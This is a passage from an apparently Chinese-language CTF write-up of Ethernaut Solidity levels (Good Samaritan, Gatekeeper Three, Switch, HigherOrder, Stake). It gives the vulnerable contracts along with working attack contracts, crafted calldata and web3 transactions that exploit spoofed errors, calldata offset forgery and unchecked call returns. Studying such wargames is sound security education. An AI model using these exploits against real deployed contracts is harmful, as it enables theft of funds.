class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level27-good-samaritan">level27 Good Samaritan</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract GoodSamaritan &#123;</span><br><span class="line">    Wallet public wallet;</span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        wallet = new Wallet();</span><br><span class="line">        coin = new Coin(address(wallet));</span><br><span class="line"></span><br><span class="line">        wallet.setCoin(coin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function requestDonation() external returns (bool enoughBalance) &#123;</span><br><span class="line">        // donate 10 coins to requester</span><br><span class="line">        try wallet.donate10(msg.sender) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; catch (bytes memory err) &#123;</span><br><span class="line">            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123;</span><br><span class="line">                // send the coins left</span><br><span class="line">                wallet.transferRemainder(msg.sender);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Coin &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error InsufficientBalance(uint256 current, uint256 required);</span><br><span class="line"></span><br><span class="line">    constructor(address wallet_) &#123;</span><br><span class="line">        // one million coins for Good Samaritan initially</span><br><span class="line">        balances[wallet_] = 10 ** 6;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address dest_, uint256 amount_) external &#123;</span><br><span class="line">        uint256 currentBalance = balances[msg.sender];</span><br><span class="line"></span><br><span class="line">        // transfer only occurs if balance is enough</span><br><span class="line">        if (amount_ &lt;= currentBalance) &#123;</span><br><span class="line">            balances[msg.sender] -= amount_;</span><br><span class="line">            balances[dest_] += amount_;</span><br><span class="line"></span><br><span class="line">            if (dest_.isContract()) &#123;</span><br><span class="line">                // notify contract</span><br><span class="line">                INotifyable(dest_).notify(amount_);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            revert InsufficientBalance(currentBalance, amount_);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    // The owner of the wallet instance</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    error OnlyOwner();</span><br><span class="line">    error NotEnoughBalance();</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        if (msg.sender != owner) &#123;</span><br><span class="line">            revert OnlyOwner();</span><br><span class="line">        &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate10(address dest_) external onlyOwner &#123;</span><br><span class="line">        // check balance left</span><br><span class="line">        if (coin.balances(address(this)) &lt; 10) &#123;</span><br><span class="line">            revert NotEnoughBalance();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // donate 10 coins</span><br><span class="line">            coin.transfer(dest_, 10);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferRemainder(address dest_) external onlyOwner &#123;</span><br><span class="line">        // transfer balance left</span><br><span class="line">        coin.transfer(dest_, coin.balances(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setCoin(Coin coin_) external onlyOwner &#123;</span><br><span class="line">        coin = coin_;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface INotifyable &#123;</span><br><span class="line">    function notify(uint256 amount) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目信任了外部合约，但是外部合约也可以抛出异常。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface GoodSamaritan &#123;</span><br><span class="line">    function requestDonation() external returns (bool enoughBalance);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Coin &#123;</span><br><span class="line">    function transfer(address dest_, uint256 amount_) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    error NotEnoughBalance();</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        GoodSamaritan s = GoodSamaritan(0x42D876AE69C2998ba4a61005Aa1D55b736Cf1161);</span><br><span class="line">        s.requestDonation();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function notify(uint256 amount) external &#123;</span><br><span class="line">        if(amount &lt; 100) &#123;</span><br><span class="line">            revert NotEnoughBalance();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level28-gatekeeper-three">level28 Gatekeeper Three</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleTrick &#123;</span><br><span class="line">    GatekeeperThree public target;</span><br><span class="line">    address public trick;</span><br><span class="line">    uint256 private password = block.timestamp;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _target) &#123;</span><br><span class="line">        target = GatekeeperThree(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function checkPassword(uint256 _password) public returns (bool) &#123;</span><br><span class="line">        if (_password == password) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        password = block.timestamp;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trickInit() public &#123;</span><br><span class="line">        trick = address(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trickyTrick() public &#123;</span><br><span class="line">        if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123;</span><br><span class="line">            target.getAllowance(password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperThree &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    address public entrant;</span><br><span class="line">    bool public allowEntrance;</span><br><span class="line"></span><br><span class="line">    SimpleTrick public trick;</span><br><span class="line"></span><br><span class="line">    function construct0r() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        require(tx.origin != owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        require(allowEntrance == true);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree() &#123;</span><br><span class="line">        if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAllowance(uint256 _password) public &#123;</span><br><span class="line">        if (trick.checkPassword(_password)) &#123;</span><br><span class="line">            allowEntrance = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createTrick() public &#123;</span><br><span class="line">        trick = new SimpleTrick(payable(address(this)));</span><br><span class="line">        trick.trickInit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter() public gateOne gateTwo gateThree &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个一个绕就好，在同一次交易中<code>block.timestamp</code>永远是一样的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./problem.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    GatekeeperThree gk3 = GatekeeperThree(payable(0x232C42E63f776A7AffAF1C02eeb58579158821dF));</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        gk3.construct0r();</span><br><span class="line">        gk3.createTrick();</span><br><span class="line">        gk3.getAllowance(block.timestamp);</span><br><span class="line">        (bool b, ) = payable(address(gk3)).call&#123;value: 0.002 ether&#125;(&#x27;&#x27;);</span><br><span class="line">        gk3.enter();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function rece1ve() public payable &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level29-switch">level29 Switch</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Switch &#123;</span><br><span class="line">    bool public switchOn; // switch is off</span><br><span class="line">    bytes4 public offSelector = bytes4(keccak256(&quot;turnSwitchOff()&quot;));</span><br><span class="line"></span><br><span class="line">    modifier onlyThis() &#123;</span><br><span class="line">        require(msg.sender == address(this), &quot;Only the contract can call this&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOff() &#123;</span><br><span class="line">        // we use a complex data type to put in memory</span><br><span class="line">        bytes32[1] memory selector;</span><br><span class="line">        // check that the calldata at position 68 (location of _data)</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(selector, 68, 4) // grab function selector from calldata</span><br><span class="line">        &#125;</span><br><span class="line">        require(selector[0] == offSelector, &quot;Can only call the turnOffSwitch function&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flipSwitch(bytes memory _data) public onlyOff &#123;</span><br><span class="line">        (bool success,) = address(this).call(_data);</span><br><span class="line">        require(success, &quot;call failed :(&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function turnSwitchOn() public onlyThis &#123;</span><br><span class="line">        switchOn = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function turnSwitchOff() public onlyThis &#123;</span><br><span class="line">        switchOn = false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目通过检测<code>calldata</code>中的特定位置来做限制，我们可以伪造它。<code>calldata</code>中的不定长度参数依照<code>offset、length、data</code>的格式传入。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">from</span> : player,</span><br><span class="line">        to : contract.<span class="property">address</span>,</span><br><span class="line">        data : <span class="string">&#x27;0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000004020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>函数选择器：0x30c13ade</p>
<p>构造<code>offset</code>：0x40</p>
<p>过检测的东西：0x20606e15</p>
<p>构造<code>length</code>：0x4</p>
<p>真正的参数：0x76227e12</p>
<h2 id="level30-higherorder">level30 HigherOrder</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.6.12;</span><br><span class="line"></span><br><span class="line">contract HigherOrder &#123;</span><br><span class="line">    address public commander;</span><br><span class="line"></span><br><span class="line">    uint256 public treasury;</span><br><span class="line"></span><br><span class="line">    function registerTreasury(uint8) public &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(treasury_slot, calldataload(4))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimLeadership() public &#123;</span><br><span class="line">        if (treasury &gt; 255) commander = msg.sender;</span><br><span class="line">        else revert(&quot;Only members of the Higher Order can become Commander&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造一个大于255的参数即可。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">from</span> : player,</span><br><span class="line">        to : contract.<span class="property">address</span>,</span><br><span class="line">        data : web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionSignature</span>(<span class="string">&quot;registerTreasury(uint8)&quot;</span>) + web3.<span class="property">utils</span>.<span class="title function_">leftPad</span>(web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(<span class="number">0x4321</span>), <span class="number">64</span>).<span class="title function_">slice</span>(<span class="number">2</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h2 id="level31-stake">level31 Stake</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract Stake &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public totalStaked;</span><br><span class="line">    mapping(address =&gt; uint256) public UserStake;</span><br><span class="line">    mapping(address =&gt; bool) public Stakers;</span><br><span class="line">    address public WETH;</span><br><span class="line"></span><br><span class="line">    constructor(address _weth) payable&#123;</span><br><span class="line">        totalStaked += msg.value;</span><br><span class="line">        WETH = _weth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function StakeETH() public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0.001 ether, &quot;Don&#x27;t be cheap&quot;);</span><br><span class="line">        totalStaked += msg.value;</span><br><span class="line">        UserStake[msg.sender] += msg.value;</span><br><span class="line">        Stakers[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line">    function StakeWETH(uint256 amount) public returns (bool)&#123;</span><br><span class="line">        require(amount &gt;  0.001 ether, &quot;Don&#x27;t be cheap&quot;);</span><br><span class="line">        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));</span><br><span class="line">        require(bytesToUint(allowance) &gt;= amount,&quot;How am I moving the funds honey?&quot;);</span><br><span class="line">        totalStaked += amount;</span><br><span class="line">        UserStake[msg.sender] += amount;</span><br><span class="line">        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));</span><br><span class="line">        Stakers[msg.sender] = true;</span><br><span class="line">        return transfered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Unstake(uint256 amount) public returns (bool)&#123;</span><br><span class="line">        require(UserStake[msg.sender] &gt;= amount,&quot;Don&#x27;t be greedy&quot;);</span><br><span class="line">        UserStake[msg.sender] -= amount;</span><br><span class="line">        totalStaked -= amount;</span><br><span class="line">        (bool success, ) = payable(msg.sender).call&#123;value : amount&#125;(&quot;&quot;);</span><br><span class="line">        return success;</span><br><span class="line">    &#125;</span><br><span class="line">    function bytesToUint(bytes memory data) internal pure returns (uint256) &#123;</span><br><span class="line">        require(data.length &gt;= 32, &quot;Data length must be at least 32 bytes&quot;);</span><br><span class="line">        uint256 result;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            result := mload(add(data, 0x20))</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目合约<code>StakeWETH</code>函数并未检查返回值，我们可以用一个合约去虚空质押。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;problem.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface WETH &#123;</span><br><span class="line">    function approve(address spender, uint256 value) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Stake stake = Stake(0xa3d2894377e942Cf797e02504f094f67D8B09176);</span><br><span class="line">    WETH weth = WETH(0x42A09C3fbfb22774936B5D5d085e2FA7963b0db8);</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        bool b = weth.approve(0xa3d2894377e942Cf797e02504f094f67D8B09176, 1 ether);</span><br><span class="line">        if(!b) revert();</span><br><span class="line">        stake.StakeETH&#123;value : 0.1 ether&#125;();</span><br><span class="line">        stake.StakeWETH(0.1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后我们再实际质押eth并取出即可获得质押者身份。</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">步骤</td>
<td style="text-align:center">合约虚空质押</td>
<td style="text-align:center">合约质押真钱</td>
<td style="text-align:center">玩家质押真钱</td>
<td style="text-align:center">玩家取出真钱</td>
</tr>
<tr>
<td style="text-align:center">totalStake</td>
<td style="text-align:center">0.1</td>
<td style="text-align:center">0.2</td>
<td style="text-align:center">0.3</td>
<td style="text-align:center">0.2</td>
</tr>
<tr>
<td style="text-align:center">UserStake[player]</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0.1</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">UserStake[hack_contract]</td>
<td style="text-align:center">0.1</td>
<td style="text-align:center">0.2</td>
<td style="text-align:center">0.2</td>
<td style="text-align:center">0.2</td>
</tr>
<tr>
<td style="text-align:center">balance(problem)</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0.1</td>
<td style="text-align:center">0.2</td>
<td style="text-align:center">0.1</td>
</tr>
</tbody>
</table>
<h2 id="level33-magic-animal-carousel">level33 Magic Animal Carousel</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.28;</span><br><span class="line"></span><br><span class="line">contract MagicAnimalCarousel &#123;</span><br><span class="line">    uint16 constant public MAX_CAPACITY = type(uint16).max;</span><br><span class="line">    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) &lt;&lt; 160 + 16;</span><br><span 